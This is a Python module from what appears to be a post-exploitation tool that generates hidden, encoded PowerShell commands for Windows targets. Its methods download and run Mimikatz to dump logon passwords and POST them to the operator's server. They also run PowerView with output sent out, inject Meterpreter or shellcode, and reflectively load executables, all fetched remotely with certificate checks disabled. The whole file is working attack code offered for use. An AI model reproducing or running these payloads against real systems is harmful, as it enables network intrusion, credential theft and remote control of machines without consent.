from logger import *
from base64 import b64encode
import logging
import settings

def ps_command(command):
    logging.info('PS command to be encoded: ' + command)

    if settings.args.server == 'https':
        logging.info('Disabling certificate checking for the following PS command: ' + command)
        command = "[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};" + command

    if settings.args.force_ps32:
        logging.info('Forcing the following command to execute in a 32bit PS process: ' + command)
        command = '%SystemRoot%\\SysWOW64\\WindowsPowershell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
    else:
        command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
    
    logging.info('Full PS command: ' + command)

    return command

class PowerShell:

    """
        https://www.youtube.com/watch?v=nm6DO_7px1I
    """

    def __init__(self, server, localip):
        self.localip = localip
        self.protocol = server
        self.func_name = settings.args.obfs_func_name

    def mimikatz(self, command='privilege::debug sekurlsa::logonpasswords exit'):

        command = """
        IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}:{port}/Invoke-Mimikatz.ps1');
        $creds = Invoke-{func_name} -Command '{katz_command}';
        $request = [System.Net.WebRequest]::Create('{protocol}://{addr}:{port}/');
        $request.Method = 'POST';
        $request.ContentType = 'application/x-www-form-urlencoded';
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($creds);
        $request.ContentLength = $bytes.Length;
        $requestStream = $request.GetRequestStream();
        $requestStream.Write( $bytes, 0, $bytes.Length );
        $requestStream.Close();
        $request.GetResponse();""".format(protocol=self.protocol,
                                          port=settings.args.server_port,
                                          func_name=self.func_name,
                                          addr=self.localip,
                                          katz_command=command)

        return ps_command(command)

    def powerview(self, command):

        command = """
        IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}:{port}/powerview.ps1');
        $output = {view_command} | Out-String;
        $request = [System.Net.WebRequest]::Create('{protocol}://{addr}:{port}/');
        $request.Method = 'POST';
        $request.ContentType = 'application/x-www-form-urlencoded';
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($output);
        $request.ContentLength = $bytes.Length;
        $requestStream = $request.GetRequestStream();
        $requestStream.Write( $bytes, 0, $bytes.Length );
        $requestStream.Close();
        $request.GetResponse();""".format(protocol=self.protocol,
                                          port=settings.args.server_port,
                                          addr=self.localip,
                                          view_command=command)

        return ps_command(command)

    def inject_meterpreter(self):
        command = """
        IEX (New-Object Net.WebClient).DownloadString('{0}://{1}:{2}/Invoke-Shellcode.ps1');
        Invoke-{3} -Force -Payload windows/meterpreter/{4} -Lhost {5} -Lport {6}""".format(self.protocol,
                                                                                           settings.args.server_port,
                                                                                           self.localip,
                                                                                           self.func_name,
                                                                                           settings.args.inject[4:],
                                                                                           settings.args.met_options[0],
                                                                                           settings.args.met_options[1])
        if settings.args.procid:
            command += " -ProcessID {}".format(settings.args.procid)

        command += ';'

        return ps_command(command)

    def inject_shellcode(self):
        command = """
        IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}:{port}/Invoke-Shellcode.ps1');
        $WebClient = New-Object System.Net.WebClient;
        [Byte[]]$bytes = $WebClient.DownloadData('{protocol}://{addr}:{port}/{shellcode}');
        Invoke-{func_name} -Force -Shellcode $bytes""".format(protocol=self.protocol,
                                                              port=settings.args.server_port,
                                                              func_name=self.func_name,
                                                              addr=self.localip,
                                                              shellcode=settings.args.path.split('/')[-1])

        if settings.args.procid:
            command += " -ProcessID {}".format(settings.args.procid)

        command += ';'

        return ps_command(command)

    def inject_exe_dll(self):
        command = """
        IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}:{port}/Invoke-ReflectivePEInjection.ps1');
        Invoke-{func_name} -PEUrl {protocol}://{addr}:{port}/{pefile}""".format(protocol=self.protocol,
                                                                                port=settings.args.server_port,
                                                                                func_name=self.func_name,
                                                                                addr=self.localip,
                                                                                pefile=settings.args.path.split('/')[-1])

        if settings.args.procid:
            command += " -ProcID {}"

        if settings.args.inject == 'exe' and settings.args.exeargs:
            command += " -Exesettings.args \"{}\"".format(settings.args.exeargs)

        command += ';'

        return ps_command(command)